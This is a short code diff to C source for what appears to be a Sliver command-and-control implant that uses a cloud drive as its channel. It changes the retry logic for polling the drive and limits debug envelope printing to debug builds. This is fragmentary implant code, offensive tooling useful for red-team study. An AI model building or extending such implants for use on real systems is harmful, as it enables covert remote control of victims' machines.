@@ -134,7 +134,7 @@ BOOL DriveStart
 
 	SecureZeroMemory(szRespFileName, sizeof(szRespFileName));
 	wsprintfA(szRespFileName, "%s.%s", lpPublicKeyHexDigest, pProfile->lpStartExtension);
-	while (dwNumberOfTries < pConfig->dwMaxFailure) {
+	while (dwNumberOfTries < pConfig->dwMaxConnectionErrors) {
 		Sleep(pProfile->dwPollInterval * 1000);
 		pRespData = DriveDownload(pDriveClient, szRespFileName);
 		if (pRespData != NULL) {
@@ -195,6 +195,7 @@ BOOL DriveSend
 	PBUFFER pCipherText = NULL;
 	PDRIVE_PROFILE pProfile = NULL;
 
+#ifdef _DEBUG
 	if (pEnvelope != NULL && pEnvelope->pData != NULL) {
 		PrintFormatA("Write Envelope:\n");
 		if (pEnvelope->pData->cbBuffer > 0x800) {
@@ -208,6 +209,7 @@ BOOL DriveSend
 	else {
 		PrintFormatA("Write Envelope: []\n");
 	}
+#endif
 	
 	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
@@ -334,12 +336,7 @@ PENVELOPE DriveRecv
 #ifdef _DEBUG
 	PrintFormatA("----------------------------------------------------\nReceive Envelope:\n");
 	if (pResult->pData != NULL && pResult->pData->cbBuffer > 0) {
-		if (pResult->pData->cbBuffer > 0x800) {
-			HexDump(pResult->pData->pBuffer, 0x800);
-		}
-		else {
-			HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
-		}
+		HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
 	}
 	else {
 		PrintFormatA("[]\n");
